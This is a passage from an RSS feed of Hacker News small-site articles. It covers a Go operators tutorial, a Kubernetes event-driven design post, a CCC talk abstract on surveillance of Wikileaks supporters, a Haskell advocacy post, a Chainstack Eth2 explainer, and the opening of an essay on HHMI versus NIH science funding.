var strFlo string = strconv.FormatFloat(flo, 'E', -1, 32)
fmt.Println(reflect.TypeOf(strFlo))</code></pre><h3 id="float-to-int-">Float to int:</h3><p>Casting of basic datatypes like int and floats is a lot easier and can be done using the following syntax.</p><pre><code>var f32 float32 = 3.1415926535
fmt.Println(reflect.TypeOf(f32))

i32 := int32(f32)
fmt.Println(reflect.TypeOf(i32))</code></pre><h2 id="operators">Operators</h2><p>An operator is a symbol that tells the Go compiler to perform a specific action. The following code blocks will show you all the basic operators of the Go programming language and how you can use them in your applications.</p><h3 id="arithmetic-operators-">Arithmetic Operators:</h3><p>Arithmetic operators are used to perform common arithmetic actions like adding or subtracting numbers. Here is a list of the most common arithmetic operators:</p><ul><li>'+' (Addition) - Adds to operands</li><li>'-' (Subtraction) - Builds the sum of two numbers by subtracting them</li><li>'*' (Multiplication) - Multiplies two values with each other</li><li>'/' (Division) - Divides two values</li><li>'%' (Modulus) - Gets the remainder after an integer division</li></ul><p>Let's look at how you can actually use these operators in your applications.</p><pre><code>package main

import "fmt"

func main() {
    var i int = 10
    var k int = 20

    // Arithmetic Operators
    fmt.Printf("i + k = %d\n", i+k)
    fmt.Printf("i - k = %d\n", i-k)
    fmt.Printf("i * k = %d\n", i*k)
    fmt.Printf("i / k = %d\n", i/k)
    fmt.Printf("i mod k = %d\n", i%k)
}</code></pre><p>The output of running the above program should be:</p><pre><code># Output
i + k = 30
i - k = -10
i * k = 200
i / k = 0
i mod k = 10</code></pre><h3 id="comparison-operators-">Comparison Operators:</h3><p>Comparison operators are used to compare two values with each other.</p><ul><li>'==' (Equal to) - Returns true if x is equal to y</li><li> '!=' (Not equal to) - Returns true if x is not equal y</li><li>'&lt;' (Lesser than) - Returns true if x is lesser than y </li><li>'&lt;=' (Lesser than Equal to) - Returns true if x is lesser than or equal to y</li><li>'&gt;' (Greater than) - Returns true if x is greater than y </li><li>'&gt;=' (Greater than Equal to) - Returns true if x is greater than or equal to y</li></ul><p>Here is an example of these operators in action.</p><pre><code>package main

import "fmt"

func main() {
    var i int = 10
    var k int = 20

    // Comparison Operators
    fmt.Println(i == k)
    fmt.Println(i != k)
    fmt.Println(i &lt; k)
    fmt.Println(i &lt;= k)
    fmt.Println(i &gt; k)
    fmt.Println(i &gt;= k)
}</code></pre><p>You should see the following output when running the program:</p><pre><code># Output
false
true
true
true
false
false</code></pre><h3 id="logical-operators-">Logical Operators:</h3><p>Logical operators are used to combine multiple conditions or to complement the evaluation of the original condition.</p><ul><li>'&amp;&amp;' (Logical AND) - Returns true if all conditions are true</li><li>'||' (Logical OR) - &nbsp;Returns true if at least one condition is true</li><li>'!' (Logical NOT) - &nbsp;Inverts the result of the condition e.g. true to false and vise versa</li></ul><p>Here is an example to show you the operators in action:</p><pre><code>package main

import "fmt"

func main() {
    var i int = 10
    var k int = 20
    var z int = 30

    // Logical Operators
    fmt.Println(i &lt; z &amp;&amp; i &gt; k)
    fmt.Println(i &lt; z || i &gt; k)
    fmt.Println(!(i == z &amp;&amp; i &gt; k))
}</code></pre><p>You should see the following output when running the program:</p><pre><code># Output
false
true
true</code></pre><h3 id="assignment-operators-">Assignment Operators:</h3><p>Assignment operators are used to assign a specific value to a variable.</p><ul><li>'=' (Simple Assignment) - &nbsp;Assigns the value to the variable </li><li>'+=' (Add Assignment) - &nbsp;Adds the value to the current value of the variable</li><li>'-=' (Subtract Assignment) - &nbsp;Subtracts the value to the current value of the variable</li><li>'*=' (Multiply Assignment) - &nbsp;Multiplies the current value of the variable with the new value</li><li>'/=' (Division Assignment) - Divides the current value of the variable by the new value</li><li>'%=' (Modulus Assignment) - Takes modulus of the two values and assigns the result to left operand</li></ul><p>Here is a practical example of the assignment operators:</p><pre><code>package main

import "fmt"

func main() {
    // …</code></pre></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://gabrieltanner.org/blog/an-introduction-to-golang">https://gabrieltanner.org/blog/an-introduction-to-golang</a></em></p>]]>
            </description>
            <link>https://gabrieltanner.org/blog/an-introduction-to-golang</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567938</guid>
            <pubDate>Tue, 29 Dec 2020 08:45:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Events, the DNA of Kubernetes [Updated]]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25567797">thread link</a>) | @mikesabbagh
<br/>
December 29, 2020 | https://www.mgasch.com/post/k8sevents/ | <a href="https://web.archive.org/web/*/https://www.mgasch.com/post/k8sevents/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">




  <article>

    

    <section>
      

<p><em>Aug 1, 2019: Updated for clarity based on the great community feedback, special thanks to <a href="https://twitter.com/x0rg">Raffaele Di Fazio</a>.</em></p>

<p>Understanding the various components and overall system design of Kubernetes is not an easy task. This is partially due to the designers of Kubernetes fully embracing a microservices based architecture. I.e. every piece of the <em>control (“masters”) and data plane (“nodes/workers”)</em> is implemented as distinct services (controllers). Major advantages of this architecture are flexibility and independence in development/deployment, horizontal scalability and failure tolerance, i.e. running two or more (typically n+1) instances of critical processes like etcd, scheduler, API server, etc.</p>

<p>The following diagram from the Kubernetes docs shows the various components. You can read more about that <a href="https://kubernetes.io/docs/concepts/overview/components/">here</a>.</p>

<center><img src="https://www.mgasch.com/images/k8s-arch.png" alt="Kubernetes Architecture - Source: Kubernetes.io"></center>

<p>The downside is that such a microservices based architecture always comes with a steep learning curve. But this knowledge is critical for both, developers and operators, maintaining Kubernetes or developing workloads on top of it. It’s a distributed system par excellence. In my engagements with customers, colleagues and with the community I dedicate a lot of time going into the details of how Kubernetes works. Because across the board, there is often confusion or misunderstanding of the architecture, opening the door for unnecessary discussions or, even worse, failure.</p>

<blockquote>
<p><em>“If you cannot explain something in simple terms, you don’t understand it.”</em></p>

<p>Richard Feynman</p>
</blockquote>

<p>I realized that just by describing the individual components and adding some buzzword-magic like “choreography”, “controllers”, “stateless” and “leader election” does not always make it easier to understand what’s going on and how Kubernetes delivers on the aforementioned promises of a microservices based design.</p>

<p>If I would have to describe Kubernetes in one sentence it would be:</p>

<blockquote>
<p>“Autonomous processes reacting to events from the API server”.</p>
</blockquote>

<p>These <em>processes</em> are modeled as <em>control loops</em> (observe-&gt;analyze-&gt;act<sup id="fnref:1"><a href="#fn:1">1</a></sup> <sup id="fnref:2"><a href="#fn:2">2</a></sup>) and <strong>only communicate</strong> with the API server, i.e. never directly with each other. An <em>event</em> is simply an immutable fact that happened, e.g. “pod created”. This is also referred to as <em>event-driven architecture</em><sup id="fnref:3"><a href="#fn:3">3</a></sup> where the flow between the individual components (microservices) is a choreography without a central orchestrator.</p>

<p>While working on another (long overdue) blog post I had to create an event-workflow diagram, using the Kubernetes Horizontal Pod Autoscaler<sup id="fnref:4"><a href="#fn:4">4</a></sup>. In order to not let wait my followers, I did a short tweet on how I think of and explain Kubernetes. Dear lord, did that thing go viral! It certainly hit a nerve.</p>

<center><blockquote><p lang="en" dir="ltr">I see a lot of people having problems to understand how the Kubernetes platform works at the fundamental level, e.g. resiliency and behaviour. If you start thinking about Kubernetes as a fully event-driven system, there's answers to so many "Why"'s <a href="https://t.co/fwPO9XX7zk">pic.twitter.com/fwPO9XX7zk</a></p>— Michael Gasch (@embano1) <a href="https://twitter.com/embano1/status/1067537816324845569?ref_src=twsrc%5Etfw">November 27, 2018</a></blockquote>

</center>

<p>Many of you have asked for a blog post (and even Kubecon talk!) on this. So here’s what I wrote in a more readable and Google Search friendly way.</p>

<h2 id="how-i-understand-kubernetes">How I understand Kubernetes</h2>

<p>Think of the API server as a broker with multiple <em>immutable (replicated) logs</em> (or queues)<sup id="fnref:5"><a href="#fn:5">5</a></sup>, each representing a stream of events. Events are facts that can be causally related (<em>happened-before</em>) or not related at all (then we say they happened <em>concurrently</em>). <em>etcd</em> is important for the durability of events, but an implementation detail.</p>

<p>All processes (controllers), e.g. the scheduler, deployment controller, endpoint controller, Kubelet, etc. can be understood as <em>producers and/or consumers</em> of events from these logs (consumers can be producers as well, and vice versa).</p>

<p>Consumers specify the objects (and optionally namespace) they want to receive events from the API server. This is called a <em>ListWatch</em> in Kubernetes: list all events from the API server when the consumer starts, then switch to “watch mode” (triggered by new events) to reduce the load on the API server. Think of the combination of object+namespace as a dedicated (virtual) event queue the API server handles. As each event carries a resource version for the particular object it contains, e.g. a pod object, going back in time (time travel) is actually possible by requesting a specific resource version (and not seldom the cause of tricky bugs in Kubernetes<sup id="fnref:6"><a href="#fn:6">6</a></sup>).</p>

<p>Consumers and producers don’t know about each other as they’re fully decoupled (by the queue) and autonomous. This makes the whole system extremely scalable, robust and extensible (adaptable to change).</p>

<p>Thus, by design, it’s a fully <em>asynchronous and eventually consistent</em> platform. Information takes time to propagate from producers(s) to consumers(s). The diagram below shows this where the Horizontal Pod Autoscaler hasn’t caught up with the events coming from the metrics server, which also affects the downstream chain of producers and consumers in our example.</p>

<center><img src="https://www.mgasch.com/images/k8s-api-server-queues.png" alt="Kubernetes API Server - Source: Kubernetes.io"></center>

<p>There’s NO guarantee that the system will converge to the desired state (even if you got an “OK”/ACK from the control plane). For example:</p>

<pre><code>$ kubectl scale &lt;deploy&gt; --replicas &lt;n&gt; # where sum(cpu_requests) &gt; cluster_capacity
Scaled deployment &lt;deploy&gt;
</code></pre>

<p>If the control plane is running fine, you’ll get a HTTP 200 return code, i.e. “OK”, even though there is no remaining capacity in the cluster<sup id="fnref:7"><a href="#fn:7">7</a></sup>. Marko Luksa put together another great example<sup id="fnref:8"><a href="#fn:8">8</a></sup> of some unwanted <em>race conditions</em> between controllers when scaling down services.</p>

<p>Controllers essentially are <em>stateless</em> even though they perform stateful operations, e.g. the scheduler which tracks and recalculates node capacity on every pod scheduled. For efficiency and speed, received events are placed in in-memory caches or local queues in each controller. But what happens to our (local) state if a controller crashes as it does not persist state locally?</p>

<p>Persistency in the controller is not needed! The event-driven design will replay all (appropriate) events when the controller (re)starts, similar to the concept of <em>event-sourcing</em><sup id="fnref:9"><a href="#fn:9">9</a></sup>,<sup id="fnref:10"><a href="#fn:10">10</a></sup>. This property is also very useful as events from the API server are delivered <em>at most once</em>, i.e. could be lost during transmission. Another intrinsic property for increased robustness: Kubernetes is said to be <a href="https://speakerdeck.com/thockin/edge-vs-level-triggered-logic"><em>level-triggered</em></a>. If an event gets lost during transmission (e.g. network issue) or your controller misses events during downtime, the next time there’s a (re-)sync it’s going to receive the complete desired state for that object from the API server. I described how reconciliation works in the scheduler <a href="https://www.mgasch.com/post/sched-reconcile/">here</a>.</p>

<p>Since information can get delivered more than once (e.g. after failure, re-sync, etc.) and controllers don’t talk to each other directly, there’s a potential for race conditions when state is to be changed, e.g. a write to same object from different controllers. This is called <em>optimistic concurrency</em> and needs to be handled in the application layer (i.e. in each controller logic). <em>Idempotency and compare and set with retries</em> (based on monotonically increasing resource versions) are patterns used to address this<sup id="fnref:11"><a href="#fn:11">11</a></sup>.</p>

<p>Event-driven design has many more advantages and can address a lot of problems in distributed systems, most importantly temporal and spatial decoupling with queuing/buffering, applying back-pressure, event replay for auditing/debugging, etc. However, it’s not a new idea. Not at all! For example, relational databases work the same way (transaction log). The database is said to be the (stale) cache of the immutable log 😄. If you want to learn more about event-driven design, make sure to check out <a href="https://www.youtube.com/watch?v=iDey1GoAJy0">this video</a> from <a href="https://twitter.com/jboner">Jonas Boner</a>.</p>

<p>Building systems using events as a first class citizen is not specific to computer science. Events are the reason for all being. Without events, there would be no change! What is time anyways? Think about it, it’s an applied and battle-tested design in nature and can easily become a very long philosophical discussion…For the curious in you take a look at the <a href="https://www.youtube.com/user/CloserToTruth1">Closer to Truth</a> science channel on Youtube.</p>

<p>Btw: <a href="https://www.mgasch.com/post/k8sevents/@the_sttts">Stefan Schimanski</a> and <a href="https://www.mgasch.com/post/k8sevents/@mhausenblas">Michael Hausenblas</a> have written a <a href="https://blog.openshift.com/kubernetes-deep-dive-api-server-part-1/">great series</a> of how the API server actually is implemented. Remember: I was describing a thought model for a better understanding.</p>

<p>I was so happy to see all the great responses from the community and never thought of how this tweet could reach almost 100k people (according to Twitter stats) in less than a week. Thank you!</p>

<center><blockquote><p lang="en" dir="ltr">Ok now I understand Kubernetes! <a href="https://t.co/PhHzmExoA6">https://t.co/PhHzmExoA6</a></p>— Hélène Caraux (@LNbzzz) <a href="https://twitter.com/LNbzzz/status/1068517869422489600?ref_src=twsrc%5Etfw">November 30, 2018</a></blockquote>

</center>


    </section>


  
</article>

</div></div>]]>
            </description>
            <link>https://www.mgasch.com/post/k8sevents/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567797</guid>
            <pubDate>Tue, 29 Dec 2020 08:16:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CIA vs. Wikileaks [video]]]>
            </title>
            <description>
<![CDATA[
Score 320 | Comments 226 (<a href="https://news.ycombinator.com/item?id=25567659">thread link</a>) | @pdkl95
<br/>
December 28, 2020 | https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=andy">andy</a>

</p>

<p><a href="https://media.ccc.de/c/rc3/main" rel="tag">main</a>
<a href="https://media.ccc.de/c/rc3/Ethics,%20Society%20&amp;%20Politics" rel="tag">Ethics, Society &amp; Politics</a>
Playlists:
<a href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/playlist">'rc3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks/audio">audio</a></p>
<!-- %h3 About -->
<p>In this talk, I aim to report and show a collection of observations, physical, visual and other evidence of the last years incidents that strongly indicate a context of the US Central Intelligence Agency and/or potentially other entities of the US Government actions against Wikileaks and surrounding persons and organisations.</p>

<p>While the area of technical surveillance, SIGINT/COMINT and related Organizations and Methods have been more or less well understood in the hacker scene, the tactics and methods experienced and discussed in this talk are of a different type: For the moment, I would call it "initimidation surveillance" as it lacks the aspect of "covert" type of actions.</p>

<p>On the last Chaos Communication Congress, I have analysed the technical aspects of the surveillance in and surrounding the ecuadorian embassy where Julian Assange stayed; this talk shows what happened to other people - friends of Assange, supporters of Wikileaks etc - not only in England, but also in other countries / other parts of the world. </p>

<p>The idea is to not only show the scope of activities but also to contribute to a better understanding of these tactics, that might be applied also in completely different political environments where governments act in extralegal ways against activities they dislike, although they that are not a crime or easily criminalized.</p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11512-cia_vs_wikileaks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567659</guid>
            <pubDate>Tue, 29 Dec 2020 07:44:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Haskell: The Good Parts]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25567337">thread link</a>) | @_query
<br/>
December 28, 2020 | https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55 | <a href="https://web.archive.org/web/*/https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>by Marc Scholten, 29.10.2020</em></p>

<p>
There’s been a recent blog post <a href="https://www.snoyman.com/blog/2020/10/haskell-bad-parts-1" target="_blank"><q>Haskell: The Bad Parts</q></a> in the haskell community. To keep things in balance and to spread some positive vibes we should also talk about the good parts of the haskell programming language and it’s ecosystem.
</p>

<p>
Here are some of the best parts we encountered while using Haskell at digitally induced. We focus on the advantages in the web dev space because that is what we are currently working on.
</p>

<h2>Type Safety</h2>
<p>
Haskell has one of the most impressive type systems of any programming language in practical use. If you have used TypeScript or other type safe languages in the past, you should be aware of the great advantages of having a type-checked codebase. Now think TypeScript - but 10x better. That’s how Haskell feels like.
</p>

<p>
You save a lot of time debugging runtime errors. Once the compiler approved your code, you can be pretty sure that it is working. This kind of development process is usually a lot more fun than debugging why something is <code>null</code> or <code>undefined</code>.
</p>

<p>
Once your system has hit a certain size and when new feature requests are rolling in you will want to make changes and refactor some parts of your code base. With Haskell you feel empowered to make changes to any part of your codebase.
</p>

<p>
Compare this to the ruby ecosystem: When working with rails you usually need to have lots of tests or otherwise you cannot confidently refactor code after things are running in production. And even then things will break. With the power of the type safety provided by Haskell, we can make refactorings whenever we want.
</p>

<p>
It’s really a blessing.
</p>

<h2>Managed Side Effects</h2>
<p>The way you deal with the file system, external APIs and user input is way different in Haskell than in other less functional programming languages. Your program consists of a main routine that handles the side effects and calls all your pure functions that do the real business logic.</p>

<p>
Systems build this way scale really well because there are less moving parts. Additionally pure functions can be easily tested and changed later on.
</p>

<p>
Most other languages encourage you to do side effects in an unrestricted way. For example when working in Java, a call to an object method might indirectly change the state of many related objects. This means you cannot easily reason about what a method calls does. In Haskell most functions are pure and thus don't trigger side effects like this. And when they do you can see this already by the function's type signature.
</p>

<p>
Haskell forces you to manage your side effects in a more careful way. You can still do IO and have mutable state, you just need to make this explicit inside the type signature. This leads to a far more robust system in overall.
</p>

<h2>Performance</h2>
<p>
Out of the box the performance of Haskell based web applications is great. It just feels faster than your typical Rails or PHP application. Thanks to it’s highly optimized runtime system it can also <a href="https://www.yesodweb.com/blog/2011/03/preliminary-warp-cross-language-benchmarks" target="_blank">handle way more requests than a nodejs application</a>.
</p>

<p>
And you get all that without ever thinking about performance at all. 
</p>

<h2>Tooling</h2>
<p>In 2020 it’s finally good. Thanks to <a href="https://github.com/haskell/haskell-language-server" target="_blank">Haskell Language Server</a> there’s now an easy way to have type information, documentation on hover and smart refactorings inside your text editor.</p>

<p>
With nix, cabal and stack we have the best tools for managing Haskell dependencies. Cabal hell is a thing of the past.
</p>

<p>
Great things are also happening to the Haskell compiler itself. <a href="https://github.com/ghc-proposals/ghc-proposals/pull/282" target="_blank">We soon can write dot expressions as you know from most other programming languages:</a> <code>project.name</code> instead of <code>name project</code>.
</p>

<h2>Hiring Haskell Developers</h2>
<p>
Haskell is a secret super power in that regard. The Haskell community consists of many very smart and talented software engineers. Haskell developers usually learn about Haskell because they care about their craft and about building high quality software products instead of learning about it to get a high paying job. Exactly the kind of people you want in your team.
</p>

<h2>2020 Haskell is Ready for Prime Time</h2>
<p>
For years there has been this trend of growing use of type safety as well as the growing use of functional programming techniques. What language could fill this space better than Haskell. Haskell has really matured in the last years and in 2020 it feels like it’s finally ready to conquer the world.
</p>

<p>
If this post made you interested, <a href="https://ihp.digitallyinduced.com/" target="_blank">check out IHP, our batteries-included haskell web framework.</a>
</p></div></div>]]>
            </description>
            <link>https://ihp.digitallyinduced.com/ShowPost?postId=14ed1d41-5ea4-4608-9c96-465443cd6e55</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567337</guid>
            <pubDate>Tue, 29 Dec 2020 06:31:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eth2 and your DApps: What you need to know]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25567208">thread link</a>) | @toxzic
<br/>
December 28, 2020 | https://chainstack.com/eth2-and-your-dapps/ | <a href="https://web.archive.org/web/*/https://chainstack.com/eth2-and-your-dapps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><img loading="lazy" width="1024" height="542" src="https://chainstack.com/wp-content/uploads/2020/12/image-1024x542.png" alt="" srcset="https://chainstack.com/wp-content/uploads/2020/12/image-1024x542.png 1024w, https://chainstack.com/wp-content/uploads/2020/12/image-300x159.png 300w, https://chainstack.com/wp-content/uploads/2020/12/image-768x407.png 768w, https://chainstack.com/wp-content/uploads/2020/12/image-1536x813.png 1536w, https://chainstack.com/wp-content/uploads/2020/12/image-530x281.png 530w, https://chainstack.com/wp-content/uploads/2020/12/image-330x175.png 330w, https://chainstack.com/wp-content/uploads/2020/12/image.png 1700w" sizes="(max-width: 1024px) 100vw, 1024px"></figure><p>Do I as a DApp developer need to change my DApps and my DApp building routine and/or architecture?</p><p>No. Your DApps are safe for at least a couple of years.</p><h2>A longer explanation</h2><p>The complete Ethereum 2.0â€”officially referred to as Eth2â€”implementation and mainnet is rolled out in phases:</p><ul><li>Phase 0 â€” launched on December 1, 2020 with the Beacon Chain.</li><li>Phase 1 â€” tentative for 2021 with the introduction of shard chains.</li><li>Phase 1.5 â€” tentative for 2021 or 2022 with the docking of Eth1 to Eth2.</li><li>Phase 2 â€” no defined plans.</li></ul><p>Each of the phases introduces changes to Eth2 and how it interacts with Eth1 where your DApps are.</p><p>Letâ€™s have a look at each of the phases and if they can potentially make you change the way you work with your DApps.</p><h2>Will anything change for me after Phase 0 is initiated?</h2><p>No.</p><h3>A longer explanation</h3><p>On December 1, 2020, the Beacon Chain launched and marked the official start of Phase 0.</p><p>Whereas the Beacon Chain is the foundational component of Eth2, it’s not the full Eth2 implementation.</p><p>With the launch of Phase 1, the Beacon Chain will start validating shard chains. Until then, the Beacon Chain is a network of stakers validating blocks on the chain.</p><p>The Beacon Chain itself cannot handle Ethereum accounts and smart contracts. Accounts and smart contracts can only be done on shard chains, and even that won’t be immediately available in Phase 1.</p><p>The Beacon Chain consists of Beacon nodes and Validator clients.</p><p>To just keep an up-to-date copy of blocks on the Beacon Chain, you need a Beacon node.</p><p>To be a validator on the Beacon Chain, you need both a Beacon node, a validator client, and an Eth1 node. The Beacon node connects to the Eth1 node to monitor the Eth2 staking deposit address on Eth1 for new validators on the Beacon Chain.</p><p>The Eth1 mainnet itself is completely “unaware” of the existence of Eth2 in the form of Beacon Chain.</p><p>Architecturally, your existing DApps or your DApp building routine wonâ€™t see changes during Phase 0.</p><h2>Will anything change for me after Phase 1 is initiated?</h2><p>No.</p><h3>A longer explanation</h3><p>At some point in 2021, Eth2 will see the introduction of shard chainsâ€”the proof-of-stake chains running in parallel and coordinated by the Beacon Chain.</p><p>The Beacon Chain will be assigning validators to the shard chains and will also keep the shards up-to-date with each other.</p><p>The shard chains will first be introduced as version 1. In version 1, the shards will not be capable of executing smart contracts; they will only store the data necessary to execute smart contractsâ€”for example, time stamps, oracle data, byte information required to interact with other shards.</p><p>Version 2â€”when or if introducedâ€”will see the execution of smart contracts on the shards.</p><p>Architecturally, your existing DApps or your DApp building routine wonâ€™t see changes during Phase 1.</p><h2>Will anything change for me after Phase 1.5 is initiated?</h2><p>No, but your DApps will start responding faster, since this is when Eth2 will presumably be locked to 12 second blocks.</p><p>You wonâ€™t have to change in your smart contracts, but the centralized parts of your DAppsâ€”e.g., a web appâ€”will be fetching a quicker response to your users.</p><h3>A longer explanation</h3><p>In 2021 or 2022, the Eth1 mainnet will switch from the current proof-of-work to the proof-of-stake consensus algorithm and will be “docked” into Eth2. The process of docking, in this case, means that the Eth1 mainnet will become one of the shards of Eth2 coordinated by the Beacon Chain.</p><p>Architecturally, your existing DApps or your DApp building routine wonâ€™t see changes during Phase 1.5.</p><h2>Will anything change for me after Phase 2 is initiated?</h2><p>Yes, but what exactly will change is uncertain at this point.</p><h3>A longer explanation</h3><p>As of today, Phase 2 is not clearly defined, however this is when you might see the most changes affecting you as a DApp developer as it may have the introduction of a new Ethereum Virtual Machine.</p><p>Your existing DApps and your DApp building routine will see significant changes during Phase 2. However, at this point, there is no defined strategy on how you can be prepared for the changes other than staying up-to-date with the Eth2 developments and being a Chainstack user.</p><p><a href="https://console.chainstack.com/user/account/create" target="_blank" rel="noreferrer noopener">With Chainstack</a>, you will be prepared for Phase 2 with as little effort from you as possibleâ€”the infrastructure migration will be as seamless as viable, you will be notified of the necessary changes on your end well in advance and be supported by our extensive documentation.</p><h2>Run an Eth1 node for your Eth2 client today</h2><p><a href="https://console.chainstack.com/user/account/create" target="_blank" rel="noreferrer noopener">Run a reliable dedicated Eth1 node</a> that you can link to your Beacon node.</p><p>See also <a href="https://support.chainstack.com/hc/en-us/articles/900004755663-Connecting-your-Chainstack-Eth1-node-to-a-Prysm-Beacon-node" target="_blank" rel="noreferrer noopener">Connecting your Chainstack Eth1 node to a Prysm Beacon node</a>.</p><h2>Get early access to Eth2 nodes</h2><p><a href="https://pages.chainstack.com/ethereum-2.0" target="_blank" rel="noreferrer noopener">Contact us to get an early access to Eth2 nodes</a>.</p><h2>Join our community of innovators</h2><ul><li>To learn more about Chainstack, visit our <a href="https://docs.chainstack.com/" target="_blank" rel="noreferrer noopener">Knowledge Center</a> or join our <a href="https://gitter.im/chainstack/Lobby" target="_blank" rel="noreferrer noopener">Gitter Lobby</a>.</li><li>Sign up for a <a href="https://console.chainstack.com/user/account/create" target="_blank" rel="noreferrer noopener">free Developer account</a>, or explore the options offered by <a href="https://chainstack.com/pricing/" target="_blank" rel="noreferrer noopener">Growth or Business plans</a>.</li><li>Take a look at our pricing tiers using a <a href="https://chainstack.com/pricing/" target="_blank" rel="noreferrer noopener">handy calculator</a> to estimate usage and number of nodes.</li></ul><p>Have you already explored what you can achieve with Chainstack? <a rel="noreferrer noopener" href="https://console.chainstack.com/user/account/create" target="_blank">Get started for free today</a>.</p></div></div>]]>
            </description>
            <link>https://chainstack.com/eth2-and-your-dapps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25567208</guid>
            <pubDate>Tue, 29 Dec 2020 06:06:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fund People, Not Projects]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25566953">thread link</a>) | @elsewhen
<br/>
December 28, 2020 | https://nintil.com/hhmi-and-nih | <a href="https://web.archive.org/web/*/https://nintil.com/hhmi-and-nih">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>So there's this paper, <em>Incentives and Creativity: Evidence from the academic life sciences</em> (Azoulay, Graff Zivin, Manso <a href="https://onlinelibrary.wiley.com/doi/abs/10.1111/j.1756-2171.2011.00140.x">2011</a>) that shows that Howard Hughes Medical Institute (HHMI) investigators (who are funded for a longer term and in a more open ended way) outperform those of the National Institutes of Health (NIH) that have shorter review cycles and more concrete grant proposals. This is seen as a vindication of the "<a href="https://twitter.com/pierre_azoulay/status/1141118605985308674">fund people, not projects</a>" paradigm. However, the effect sample reported is <em>huge</em> , perhaps too good to be true, and the extent to which this model can scale is debatable, as Azoulay himself also <a href="https://twitter.com/pierre_azoulay/status/1318578977527668736">says</a> that <em>it is not clear how well this model can scale. HHMI is very much focused on a narrow elite</em>.</p>
<blockquote>
<p>Similarly, while science generates much of our prosperity, scientists and researchers themselves do not sufficiently obsess over how it should be organized. In a recent paper, Pierre Azoulay and co-authors <a href="https://www.nber.org/papers/w15466">concluded</a> that <strong>Howard Hughes Medical Institute’s long-term grants to high-potential scientists made those scientists 96 percent more likely to produce breakthrough work</strong>. If this finding is borne out, it suggests that present funding mechanisms are likely to be far from optimal, in part because they do not focus enough on research autonomy and risk taking. (<a href="https://www.theatlantic.com/science/archive/2019/07/we-need-new-science-progress/594946/">We need a new science of progress</a>)</p>
</blockquote>
<p>
[1]. There are other NIH similar grants like the MERIT award or the Outstanding Investigator Award (R35)
</p>
<p>NIH has their own HHMI-style throw-money-at-the-best program, the Director's Pioneer award (DP1)<sup><a href="#sidenote-1">1</a></sup> which also seems to produce <a href="https://commonfund.nih.gov/sites/default/files/HRHR%20PA%20FY%202004-2006%20Outcome%20Evaluation.pdf">great</a> <a href="https://dpcpsi.nih.gov/sites/default/files/CoC-051413-Pioneer-Award-Program-DP1.pdf">results</a>. <a href="https://commonfund.nih.gov/pioneer">DP1</a> grants are similar to the HHMI Investigators program (700k per year vs ~1M at HHMI) and as selective (11 pioneers per year vs 20 for HHMI). They are not as long-lasting as the HHMI ones however in that they last for 5 years while HHMIs enjoy a theoretical 7 and a practical 15 years of funding. </p>
<p>Both have been lauded as exemplary programs that <em>cause more good science to happen that otherwise would not</em>.</p>
<p>So this seems like an important "huge if true" fact. Even if, as Azoulay suspects, this model cannot scale, it is reasonable to think that the scientific elite that would benefit from this class of funding is comprised of more than the current 250 HHMI investigators and 50 or so DP1 awardees.</p>
<p>So with this setup, let's look at first the general question (people, not projects) and then the specifics of NIH and the HHMI once we have a framework to assess them.</p>
<h2 id="fund-people-not-projects">Fund People, not projects</h2>
<p>The usual way grants are allocated is a process whereby a scientist says they want to do specific piece of work X and then they get money to do that. In <a href="https://guzey.com/how-life-sciences-actually-work/">practice</a>, researchers have already done part of what they say they will do (And use that data to support the application), and will use part of the funds to work on other things they may want to work on so they can do as they please with <em>part</em> of their time and money. But for the most part, they are working on what they say they are working on. R01 grants, the bulk of NIH's funding, run for 5 years (And this has gone <a href="https://nexus.od.nih.gov/all/2013/11/07/how-long-is-an-r01/">up</a> over time), not too dissimilar, at first glance, to the HHMI's 7.</p>
<p>With DP1 and HHMI, researchers do not submit a grant proposal for something specific they want to do, they submit their resume and a <strong>broad summary of what they are going to be working on</strong>. This research program (3k words) is shorter than a usual Nintil blogpost, and substantially shorter than one of the sample R01 grant applications from the NIAD's <a href="https://www.niaid.nih.gov/sites/default/files/1-R01-AI121500-01A1_Gordon_Application.pdf">website</a> which are over 5x longer (excluding references and CVs). </p>
<p>
